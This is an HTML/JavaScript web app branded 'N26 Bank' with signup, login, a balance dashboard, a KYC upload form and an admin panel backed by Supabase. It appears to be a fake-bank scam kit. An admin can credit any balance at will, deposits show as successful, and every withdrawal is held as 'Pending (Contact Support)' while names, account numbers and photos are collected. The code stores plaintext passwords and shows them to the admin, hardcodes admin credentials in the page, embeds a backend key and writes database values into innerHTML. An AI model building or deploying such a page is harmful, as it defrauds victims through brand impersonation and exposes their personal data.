<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>N26 Bank</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
*{box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
body{margin:0;background:#f2f4f8}
.hidden{display:none}
/* LOGIN & SIGNUP */
#loginBox,#signupBox{
  max-width:360px;margin:100px auto;background:#fff;padding:30px;
  border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,.1);
}
input,button{
  width:100%;padding:12px;margin:10px 0;border-radius:10px;border:1px solid #ccc;font-size:16px;
}
button{background:#0052cc;color:#fff;font-weight:bold;border:none;cursor:pointer}
button:hover{background:#003d99}
/* HEADER */
header{background:#0052cc;color:#fff;padding:15px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:10}
header span{font-size:28px;cursor:pointer}
/* SIDEBAR */
#sidebar{position:fixed;top:0;left:-250px;width:250px;height:100%;background:#002d72;color:#fff;padding:20px;transition:.3s;z-index:11;overflow-y:auto}
#sidebar a{display:block;padding:14px;margin-bottom:10px;background:rgba(255,255,255,.1);color:#fff;border-radius:10px;text-decoration:none;font-size:16px}
#sidebar a:hover{background:rgba(255,255,255,.2)}
#sidebar.show{left:0}
/* PAGES */
.page{padding:20px;margin-top:10px}
.card{background:#fff;padding:20px;border-radius:15px;box-shadow:0 8px 20px rgba(0,0,0,.08);margin-bottom:20px}
table{width:100%;border-collapse:collapse;font-size:14px}
th,td{border:1px solid #ccc;padding:8px;text-align:center}
th{background:#0052cc;color:#fff;font-weight:normal}
.green{color:green;font-weight:bold}
.orange{color:orange;font-weight:bold}
.red{color:red;font-weight:bold}
img{width:100px;height:100px;border-radius:50%;object-fit:cover;margin-bottom:10px}
/* RESPONSIVE */
@media(max-width:600px){
  #sidebar{width:200px;}
  table, th, td{font-size:12px;}
  button,input{font-size:14px;}
}
</style>
</head>
<body>

<!-- LOGIN -->
<div id="loginBox">
  <h2 style="text-align:center">üîê Login</h2>
  <input id="lUser" placeholder="Username">
  <input id="lPass" type="password" placeholder="Password">
  <button id="loginBtn">Login</button>
  <p id="loginMsg" style="color:red;text-align:center"></p>
  <p style="text-align:center">No account? <a href="#" id="showSignUpLink">Sign Up</a></p>
</div>

<!-- SIGNUP -->
<div id="signupBox" class="hidden">
  <h2 style="text-align:center">üìù Sign Up</h2>
  <input id="sFullName" placeholder="Full Name">
  <input id="sEmail" placeholder="Email">
  <input id="sUser" placeholder="Username">
  <input id="sPass" type="password" placeholder="Password">
  <button id="signupBtn">Sign Up</button>
  <p id="signupMsg" style="color:red;text-align:center"></p>
  <p style="text-align:center">Already have an account? <a href="#" id="showLoginLink">Login</a></p>
</div>

<!-- APP -->
<div id="app" class="hidden">
<header>
  <span id="menuToggle">‚ò∞</span>
  <b id="welcome"></b>
</header>

<div id="sidebar">
  <a id="dashLink">Dashboard</a>
  <a id="kycLink">KYC</a>
  <a id="historyLink">History</a>
  <a id="adminLink">Admin Panel</a>
  <a id="logoutLink">Logout</a>
</div>

<!-- DASHBOARD -->
<div id="dashboard" class="page hidden">
  <div class="card" style="text-align:center">
    <img id="photo">
    <h3 id="name"></h3>
    <p>Account: <span id="acct"></span></p>
    <h2>$<span id="bal"></span></h2>
  </div>
  <div class="card">
    <input id="amt" type="number" placeholder="Amount">
    <select id="type">
      <option>Deposit</option>
      <option>Withdrawal</option>
    </select>
    <button id="txnBtn">Submit</button>
  </div>
</div>

<!-- KYC -->
<div id="kyc" class="page hidden">
  <div class="card">
    <input id="kName" placeholder="Full Name">
    <input id="kAcct" placeholder="Account Number">
    <input id="kAddr" placeholder="Withdrawal Address">
    <input type="file" id="kPhoto">
    <button id="kycBtn">Submit KYC</button>
  </div>
</div>

<!-- HISTORY -->
<div id="history" class="page hidden">
  <div class="card">
    <div id="txList"></div>
  </div>
</div>

<!-- ADMIN -->
<div id="admin" class="page hidden">
  <div class="card">
    <h3>Create User</h3>
    <input id="cu" placeholder="Username">
    <input id="cp" placeholder="Password">
    <button id="createUserBtn">Create</button>
  </div>
  <div class="card">
    <h3>Fund User</h3>
    <input id="fu" placeholder="Username">
    <input id="fa" type="number" placeholder="Amount">
    <button id="fundUserBtn">Fund</button>
  </div>
  <div class="card">
    <h3>All Users & Transactions</h3>
    <table>
      <thead>
        <tr>
          <th>User</th><th>Password</th><th>Balance</th><th>Transactions</th><th>Action</th>
        </tr>
      </thead>
      <tbody id="adminTable"></tbody>
    </table>
  </div>
</div>

<script>
// SUPABASE
const supabase = supabase.createClient(
  "https://mvgwrkpqauzntjtxhtdd.supabase.co",
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im12Z3dya3BxYXV6bnRqdHhodGRkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYwNDE0NDcsImV4cCI6MjA4MTYxNzQ0N30.jtD2D0XXjCwiwysDApL_9375LzwFPVMpN63bTrmWzjU"
);

let currentUser = null;

// ELEMENTS
const loginBox = document.getElementById("loginBox");
const signupBox = document.getElementById("signupBox");
const app = document.getElementById("app");

// SHOW LOGIN/SIGNUP
document.getElementById("showSignUpLink").onclick = ()=>{loginBox.classList.add("hidden"); signupBox.classList.remove("hidden");}
document.getElementById("showLoginLink").onclick = ()=>{signupBox.classList.add("hidden"); loginBox.classList.remove("hidden");}

// BUTTON EVENTS
document.getElementById("signupBtn").onclick = async ()=>{
  const {data: exists} = await supabase.from("users").select("*").eq("username",document.getElementById("sUser").value).single();
  if(exists){document.getElementById("signupMsg").innerText="Username exists";return;}
  await supabase.from("users").insert({
    username:document.getElementById("sUser").value,
    password:document.getElementById("sPass").value,
    full_name:document.getElementById("sFullName").value,
    email:document.getElementById("sEmail").value,
    balance:0
  });
  alert("Signup Successful. Login Now");
  signupBox.classList.add("hidden"); loginBox.classList.remove("hidden");
}

document.getElementById("loginBtn").onclick = async ()=>{
  const u = document.getElementById("lUser").value;
  const p = document.getElementById("lPass").value;
  const {data} = await supabase.from("users").select("*").eq("username",u).eq("password",p).single();
  if(!data){document.getElementById("loginMsg").innerText="Invalid login";return;}
  currentUser = data;
  loginBox.style.display="none";
  signupBox.style.display="none";
  app.classList.remove("hidden");
  document.getElementById("welcome").innerText = "Welcome " + u;
  loadDash();
}

// MENU
document.getElementById("menuToggle").onclick = ()=>document.getElementById("sidebar").classList.toggle("show");
document.getElementById("dashLink").onclick = ()=>show("dashboard");
document.getElementById("kycLink").onclick = ()=>show("kyc");
document.getElementById("historyLink").onclick = ()=>show("history");
document.getElementById("adminLink").onclick = ()=>adminPrompt();
document.getElementById("logoutLink").onclick = ()=>location.reload();

// PAGE SWITCH
function show(id){
  document.querySelectorAll(".page").forEach(p=>p.classList.add("hidden"));
  document.getElementById(id).classList.remove("hidden");
  document.getElementById("sidebar").classList.remove("show");
}

// DASHBOARD
function loadDash(){
  show("dashboard");
  document.getElementById("name").innerText = currentUser.full_name || currentUser.username;
  document.getElementById("acct").innerText = currentUser.account_number || "N/A";
  document.getElementById("bal").innerText = currentUser.balance;
  document.getElementById("photo").src = currentUser.photo || "";
  loadHistory();
}

// KYC
document.getElementById("kycBtn").onclick = async ()=>{
  if(currentUser.full_name){alert("KYC already submitted");return;}
  const reader = new FileReader();
  reader.onload = async ()=>{
    await supabase.from("users").update({
      full_name: document.getElementById("kName").value,
      account_number: document.getElementById("kAcct").value,
      address: document.getElementById("kAddr").value,
      photo: reader.result
    }).eq("id", currentUser.id);
    alert("KYC Successful");
    location.reload();
  }
  reader.readAsDataURL(document.getElementById("kPhoto").files[0]);
}

// TRANSACTIONS
document.getElementById("txnBtn").onclick = async ()=>{
  const status = document.getElementById("type").value=="Deposit"?"Successful":"Pending (Contact Support)";
  await supabase.from("transactions").insert({
    username: currentUser.username,
    type: document.getElementById("type").value,
    amount: document.getElementById("amt").value,
    status: status
  });
  alert("Transaction Submitted");
  loadHistory();
  loadAdmin();
}

// HISTORY
async function loadHistory(){
  const {data} = await supabase.from("transactions").select("*").eq("username",currentUser.username);
  const txList = document.getElementById("txList");
  txList.innerHTML="";
  data.forEach(t=>{
    txList.innerHTML+=`<p>${t.type} $${t.amount} - <span class="${t.status.includes('Pending')?'green':(t.status=="Successful"?"green":"red")}">${t.status}</span></p>`;
  })
}

// ADMIN
function adminPrompt(){
  const u=prompt("Admin Username");
  const p=prompt("Admin Password");
  if(u==="admin"&&p==="Admin1234!"){show("admin");loadAdmin();}
  else alert("Denied");
}
document.getElementById("createUserBtn").onclick = async ()=>{
  await supabase.from("users").insert({username:document.getElementById("cu").value,password:document.getElementById("cp").value,balance:0});
  alert("User created");
  loadAdmin();
}
document.getElementById("fundUserBtn").onclick = async ()=>{
  const {data} = await supabase.from("users").select("*").eq("username",document.getElementById("fu").value).single();
  await supabase.from("users").update({balance: +data.balance + +document.getElementById("fa").value}).eq("id",data.id);
  await supabase.from("transactions").insert({username:document.getElementById("fu").value,type:"Deposit",amount:document.getElementById("fa").value,status:"Successful"});
  alert("User funded");
  loadAdmin();
}

async function loadAdmin(){
  const {data:users} = await supabase.from("users").select("*");
  const {data:tx} = await supabase.from("transactions").select("*");
  const adminTable = document.getElementById("adminTable");
  adminTable.innerHTML="";
  users.forEach(u=>{
    const userTx = tx.filter(t=>t.username==u.username);
    const txHtml = userTx.map(t=>{
      if(t.status.includes("Pending")){
        return `${t.type} $${t.amount} - <span class="green">${t.status}</span> 
          <button onclick="approveTxn(${t.id})">Approve</button>
          <button onclick="rejectTxn(${t.id})">Reject</button>`;
      } else {
        return `${t.type} $${t.amount} - <span class="${t.status=="Successful"?"green":"red"}">${t.status}</span>`;
      }
    }).join("<br>");
    adminTable.innerHTML+=`<tr><td>${u.username}</td><td>${u.password}</td><td>${u.balance}</td><td>${txHtml}</td><td></td></tr>`;
  })
}

// APPROVE/REJECT
async function approveTxn(txId){
  const {data: txn} = await supabase.from("transactions").select("*").eq("id",txId).single();
  const {data: user} = await supabase.from("users").select("*").eq("username",txn.username).single();
  const newBalance = +user.balance - (txn.type=="Withdrawal"? +txn.amount : 0) + (txn.type=="Deposit"? +txn.amount : 0);
  await supabase.from("transactions").update({status:"Successful"}).eq("id",txId);
  await supabase.from("users").update({balance:newBalance}).eq("id",user.id);
  alert("Transaction Approved");
  loadAdmin();
  if(currentUser.username==user.username) loadHistory();
}

async function rejectTxn(txId){
  await supabase.from("transactions").update({status:"Rejected"}).eq("id",txId);
  alert("Transaction Rejected");
  loadAdmin();
  const {data: txn} = await supabase.from("transactions").select("*").eq("id",txId).single();
  if(currentUser.username==txn.username) loadHistory();
}
</script>
</body>
    </html>
